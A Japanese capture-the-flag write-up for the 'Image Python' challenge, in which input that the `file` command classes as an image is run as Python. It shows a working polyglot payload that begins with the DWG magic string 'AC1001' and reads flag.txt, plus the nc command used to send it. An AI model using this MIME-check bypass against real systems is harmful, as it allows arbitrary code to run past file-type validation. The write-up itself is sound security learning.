# Image Python

https://alpacahack.com/daily/challenges/image-python

## 問題の概要

`file` コマンドで判定すると画像 (`image/*`) と判定されるが Python コードとして実行できるようなものを作成する問題です。

入力した hex 文字列をバイナリデータとして `file --mime-type -b -` に渡し、MIME Type を判定します。
`image/` で始まる MIME Type と判定されれば Python コードとして `exec` で実行されます。

フラグは `./flag.txt` に配置されています。

## 解法

[file コマンドのソースコード](https://github.com/file/file) を見ると、`magic/Magdir/` 以下のファイルに MIME Type を判定するためのルールが記述されていることがわかります。

例えば [magic/Magdir/sgml](https://github.com/file/file/blob/master/magic/Magdir/sgml#L17-L19) には次のようなルールが記述されています。

```
0	string/bt	\<svg			SVG Scalable Vector Graphics image
!:mime	image/svg+xml
!:ext   svg
```

これは、先頭から 0 バイト目に `<svg` という文字列があれば MIME Type を `image/svg+xml` と判定するというルールのようです。

```bash
$ echo -n "<svg" | file --mime-type -b -
/dev/stdin: image/svg+xml
```

[`image/` で検索](https://github.com/search?q=repo%3Afile%2Ffile%20image%2F&type=code) して Python の文法上問題なさそうな Magic の定義を探してみると、[magic/Magdir/cad](https://github.com/file/file/blob/1632db8145973e942987aa49355559e259473ea7/magic/Magdir/cad#L197-L198) に次のようなものが見つかりました。

```
0	string	AC1001	DWG AutoDesk AutoCAD Release 2.22
!:mime image/vnd.dwg
```

先頭に `AC1001` という文字列があれば AutoCAD の DWG ファイル (`image/vnd.dwg`) と判定されるようです。

## 解答に使用した入力

```python
AC1001 = 0
print(open("flag.txt").readline())
```

hex 文字列に変換して `nc` コマンドで送信すればフラグが得られました。

```bash
$ xxd -p -c0 input.py | nc localhost 1337
```
